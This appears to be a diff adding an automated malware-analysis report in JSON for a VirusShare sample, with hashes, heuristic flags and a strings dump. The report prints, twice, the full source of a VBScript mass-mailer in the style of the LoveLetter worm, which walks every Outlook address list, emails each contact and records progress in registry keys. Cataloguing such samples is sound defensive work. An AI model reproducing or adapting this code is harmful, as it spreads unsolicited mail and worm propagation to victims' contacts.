@@ -1,0 +1,73 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "RegRead": "May read registry keys",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "rem Test how e-mailing in VBS worx\nrem www.globalhacking.com\n\nOn Error Resume Next\ndim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad\nset regedit=CreateObject(\"WScript.Shell\")\nset out=WScript.CreateObject(\"Outlook.Application\")\nset mapi=out.GetNameSpace(\"MAPI\")\nfor ctrlists=1 to mapi.AddressLists.Count\nset a=mapi.AddressLists(ctrlists)\nx=1\nregv=regedit.RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a)\nif (regv=\"\") then\nregv=1\nend if\nif (int(a.AddressEntries.Count)> int(regv)) then\nfor ctrentries=1 to a.AddressEntries.Count\nmalead=a.AddressEntries(x)\nregad=\"\"\nregad=regedit.RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&malead)\nif (regad=\"\") then\nset male=out.CreateItem(0)\nmale.Recipients.Add(malead)\nmale.Subject = \"Vb Script Mail Test !!!!\"\nmale.Body = \"Vb Script Mail Test !!!!\"\nrem male.Attachments.Add(dirsystem&\"\\LOVE-LETTER-FOR-YOU.TXT.vbs\")\nmale.Send\nregedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&malead,1,\"REG_DWORD\"\nend if\nx=x+1\nnext\nregedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a,a.AddressEntries.Count\nelse\nregedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a,a.AddressEntries.Count\nend if\nnext\nSet out=Nothing\nSet mapi=Nothing"
+    },
+    "filename": "VirusShare_20b49737d7206cee3f4971910fe14745",
+    "filesize": 1241,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "20b49737d7206cee3f4971910fe14745",
+        "sha1": "a628b890467d06e0aa961f65b98432bf53e27844",
+        "sha256": "e80cf32a2d10e2d43422617b0648792b306705bfa76bb3fd37f4563544034959"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "rem Test how e-mailing in VBS worx",
+            "rem www.globalhacking.com",
+            "On Error Resume Next",
+            "dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad",
+            "set regedit=CreateObject(\"WScript.Shell\")",
+            "set out=WScript.CreateObject(\"Outlook.Application\")",
+            "set mapi=out.GetNameSpace(\"MAPI\")",
+            "for ctrlists=1 to mapi.AddressLists.Count",
+            "set a=mapi.AddressLists(ctrlists)",
+            "regv=regedit.RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a)",
+            "if (regv=\"\") then",
+            "regv=1",
+            "end if",
+            "if (int(a.AddressEntries.Count)> int(regv)) then",
+            "for ctrentries=1 to a.AddressEntries.Count",
+            "malead=a.AddressEntries(x)",
+            "regad=\"\"",
+            "regad=regedit.RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&malead)",
+            "if (regad=\"\") then",
+            "set male=out.CreateItem(0)",
+            "male.Recipients.Add(malead)",
+            "male.Subject = \"Vb Script Mail Test !!!!\"",
+            "male.Body = \"Vb Script Mail Test !!!!\"",
+            "rem male.Attachments.Add(dirsystem&\"\\LOVE-LETTER-FOR-YOU.TXT.vbs\")",
+            "male.Send",
+            "regedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&malead,1,\"REG_DWORD\"",
+            "end if",
+            "x=x+1",
+            "next",
+            "regedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a,a.AddressEntries.Count",
+            "else",
+            "regedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a,a.AddressEntries.Count",
+            "end if",
+            "next",
+            "Set out=Nothing",
+            "Set mapi=Nothing"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.292939",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
